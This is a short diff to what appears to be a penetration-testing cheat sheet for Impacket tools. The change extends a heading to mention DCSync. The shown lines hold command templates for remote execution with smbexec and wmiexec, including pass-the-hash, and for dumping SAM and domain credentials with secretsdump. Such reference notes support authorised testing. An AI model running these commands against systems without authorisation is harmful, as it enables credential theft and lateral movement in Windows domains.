@@ -8,7 +8,7 @@ impacket-smbexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
 impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
 ```
 
-## secretsdump (dumps SAM)
+## secretsdump (dumps SAM / DCSync)
 
 ```bash
 impacket-secretsdump DOMAIN/USER:['PASS']@IP [-just-dc] [just-dc-user USER]
